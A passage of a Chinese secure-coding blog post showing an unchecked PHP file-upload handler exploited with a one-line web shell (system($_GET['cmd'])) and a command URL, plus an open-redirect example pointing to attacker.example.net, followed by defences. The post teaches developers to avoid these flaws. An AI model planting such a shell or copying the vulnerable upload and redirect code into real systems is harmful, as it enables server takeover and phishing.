class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e上传文件是一个很危险的功能，尤其是你如果不校验上传文件的类型的话，你可能会中很多很多的招，这种攻击相当狠。\u003cstrong\u003e试想，如果用户上传给你一个PHP、ASP、JSP的文件，当有人访问这个文件时，你的服务器会解释执行之，这就相当于他可以在你的服务器上执行一段程序。这无疑是相当危险的。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e举个例子：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"html\" class=\"EnlighterJSRAW\"\u003e\u0026lt;form action=\u0026#34;upload_picture.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt;\n要上传的文件:\n\u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;filename\u0026#34;/\u0026gt;\n\u0026lt;br/\u0026gt;\n\u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;/\u0026gt;\n\u0026lt;/form\u0026gt;\n\u003c/pre\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre data-enlighter-language=\"php\" class=\"EnlighterJSRAW\"\u003e$target = \u0026#34;pictures/\u0026#34; . basename($_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;name\u0026#39;]);\nif(move_uploaded_file($_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;tmp_name\u0026#39;], $target)){\n    echo \u0026#34;图片文件上传成功\u0026#34;;\n}else{\u0026lt;/div\u0026gt;\n    echo \u0026#34;图片文件上传失败\u0026#34;;\n}\u003c/pre\u003e\n\u003cp\u003e假如我上传了一个PHP文件如下：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"php\" class=\"EnlighterJSRAW\"\u003e\u0026lt;?php\nsystem($_GET[\u0026#39;cmd\u0026#39;]);\n?\u0026gt;\u003c/pre\u003e\n\u003cp\u003e那么，我就可以通过如下的URL访问攻击你的网站了：\u003c/p\u003e\n\u003cp\u003e\u003ccode data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003ehttp://server.example.com/upload_dir/malicious.php?cmd=ls%20-l\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e抵御这样的攻击有两种手段：\u003c/p\u003e\n\u003cp\u003e1）限制上传文件的文件扩展名。\u003c/p\u003e\n\u003cp\u003e2）千万不要使用root或Administrator来运行你的Web应用。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"URL%E8%B7%B3%E8%BD%AC\"\u003e\u003c/span\u003eURL跳转\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003eURL跳转很有可能会成为攻击利用的工具。\u003c/p\u003e\n\u003cp\u003e比如下面的PHP代码：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"php\" class=\"EnlighterJSRAW\"\u003e$redirect_url = $_GET[\u0026#39;url\u0026#39;];\nheader(\u0026#34;Location: \u0026#34; . $redirect_url);\u003c/pre\u003e\n\u003cp\u003e这样的代码可能很常见，比如当用户在访问你的网站某个页观的时候没有权限，于是你的网站跳转到登录页面，当然登录完成后又跳转回刚才他访问的那个页面。一般来说，我们都会在跳转到登录页面时在URL里加上要被跳转过去的网页。于是会出现上述那样的代码。\u003c/p\u003e\n\u003cp\u003e于是我们就可以通过下面的URL，跳转到一个恶意网站上，而那个网站上可能有一段CSRF的代码在等着你，或是一个钓鱼网站。\u003c/p\u003e\n\u003cp\u003e\u003ccode data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003ehttp://bank.example.com/redirect?url=http://attacker.example.net\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这种攻击具有的迷惑性在于，用户看到的http://bank.example.com，\u003cstrong\u003e以为是一个合法网站，于是就点了这个链接，结果通过这个合法网站，把用户带到了一个恶意网站，而这个恶意网站上可能把页面做得跟这个合法网站一模一样，你还以为访问的是正确的地方，结果就被钓鱼了\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e解决这个问题很简单，你需要在你的后台判断一下传过来的URL的域名是不是你自己的域名。\u003c/p\u003e\n\u003cp\u003e你可以看看Google和Baidu搜索引擎的链接跳转，百度的跳转链接是被加密过的，而Google的网站链接很长，里面有网站的明文，但是会有几个加密过的参数，如果你把那些参数移除掉，Google会显示一个重定向的提醒页面。（我个人觉得还是Google做得好）\u003c/p\u003e\n\u003cp\u003e（本篇文章结束）\u003c/p\u003e\n\u003cp\u003e这段时间工作和家里的事比较多，所以时间有限，更新不快，而此篇行文比较仓促，欢迎大家补充，并指出我文中的问题。\u003c/p\u003e\n\u003cdiv style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\"\u003e\n\u003cp align=\"center\"\u003e\u003cstrong\u003e（转载本站文章请注明作者和出处 \u003ca href=\"https://coolshell.cn/\"\u003e酷 壳 – CoolShell\u003c/a\u003e ，请勿用于任何商业用途）\u003c/strong\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cdiv class=\"wp_rp_wrap  wp_rp_vertical_m\" id=\"wp_rp_first\"\u003e\u003cdiv class=\"wp_rp_content\"\u003e\u003ch3 class=\"related_post_title\"\u003e相关文章\u003c/h3\u003e\u003cul class=\"related_post wp_rp\"\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/18094.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png\" alt=\"如何免费的让网站启用HTTPS\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/18094.html\" class=\"wp_rp_title\"\u003e如何免费的让网站启用HTTPS\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/11021.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2014/02/Github-Security-150x150.png\" alt=\"从“黑掉Github”学Web安全开发\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/11021.html\" class=\"wp_rp_title\"\u003e从“黑掉Github”学Web安全开发\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/6043.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg\" alt=\"Web开发中需要了解的东西\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/6043.html\" class=\"wp_rp_title\"\u003eWeb开发中需要了解的东西\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/5987.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg\" alt=\"如何设计“找回用户帐号”功能\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/5987.html\" class=\"wp_rp_title\"\u003e如何设计“找回用户帐号”功能\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/5353.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"你会做Web上的用户登录功能吗？\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/5353.html\" class=\"wp_rp_title\"\u003e你会做Web上的用户登录功能吗？\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/21708.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-150x150.png\" alt=\"网络数字身份认证术\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/21708.html\" class=\"wp_rp_title\"\u003e网络数字身份认证术\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/div\u003e\u003c/div\u003e\n\u003cdiv id=\"post-ratings-8711\" class=\"post-ratings\" itemscope=\"\" itemtype=\"https://schema.org/Article\" data-nonce=\"355f47d3ad\"\u003e\u003cimg id=\"rating_8711_1\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"好烂啊\" title=\"好烂啊\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(8711, 1, \u0026#39;好烂啊\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.1, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-fe6ec1d619ab5af4a9106cdb-=\"\"/\u003e\u003cimg id=\"rating_8711_2\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"有点差\" title=\"有点差\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(8711, 2, \u0026#39;有点差\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.1, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-fe6ec1d619ab5af4a9106cdb-=\"\"/\u003e\u003cimg id=\"rating_8711_3\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"凑合看看\" title=\"凑合看看\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(8711, 3, \u0026#39;凑合看看\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.1, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-fe6ec1d619ab5af4a9106cdb-=\"\"/\u003e\u003cimg id=\"rating_8711_4\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"还不错\" title=\"还不错\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(8711, 4, \u0026#39;还不错\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.1, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-fe6ec1d619ab5af4a9106cdb-=\"\"/\u003e\u003cimg id=\"rating_8711_5\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_off.gif\" alt=\"很精彩\" title=\"很精彩\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(8711, 5, \u0026#39;很精彩\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.1, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-fe6ec1d619ab5af4a9106cdb-=\"\"/\u003e (\u003cstrong\u003e41\u003c/strong\u003e 人打了分，平均分： \u003cstrong\u003e4.07\u003c/strong\u003e )\u003cbr/\u003e\u003cspan class=\"post-ratings-text\" id=\"ratings_8711_text\"\u003e\u003c/span\u003e\u003cmeta itemprop=\"name\" content=\"程序员疫苗：代码注入\"/\u003e\u003cmeta itemprop=\"headline\" content=\"程序员疫苗：代码注入\"/\u003e\u003cmeta itemprop=\"description\" content=\"几个月在我的微博上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。\n\n我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质...\"/\u003e\u003cmeta itemprop=\"datePublished\" content=\"2012-12-10T08:34:48+08:00\"/\u003e\u003cmeta itemprop=\"dateModified\" content=\"2012-12-12T20:23:11+08:00\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn/articles/8711.html\"/\u003e\u003cmeta itemprop=\"author\" content=\"陈皓\"/\u003e\u003cmeta itemprop=\"mainEntityOfPage\" content=\"https://coolshell.cn/articles/8711.html\"/\u003e\u003cdiv style=\"display: none;\" itemprop=\"publisher\" itemscope=\"\" itemtype=\"https://schema.org/Organization\"\u003e\u003cmeta itemprop=\"name\" content=\"酷 壳 - CoolShell\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn\"/\u003e\u003cdiv itemprop=\"logo\" itemscope=\"\" itemtype=\"https://schema.org/ImageObject\"\u003e\u003cmeta itemprop=\"url\" content=\"\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv style=\"display: none;\" itemprop=\"aggregateRating\" itemscope=\"\" itemtype=\"https://schema.org/AggregateRating\"\u003e\u003cmeta itemprop=\"bestRating\" content=\"5\"/\u003e\u003cmeta itemprop=\"worstRating\" content=\"1\"/\u003e\u003cmeta itemprop=\"ratingValue\" content=\"4.07\"/\u003e\u003cmeta itemprop=\"ratingCount\" content=\"41\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv id=\"post-ratings-8711-loading\" class=\"post-ratings-loading\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif\" width=\"16\" height=\"16\" class=\"post-ratings-image\"/\u003eLoading...\u003c/div\u003e\n\u003c/div\u003e",
  "Date": "2012-12-10T08:34:48+08:00",
  "Author": "陈皓"
}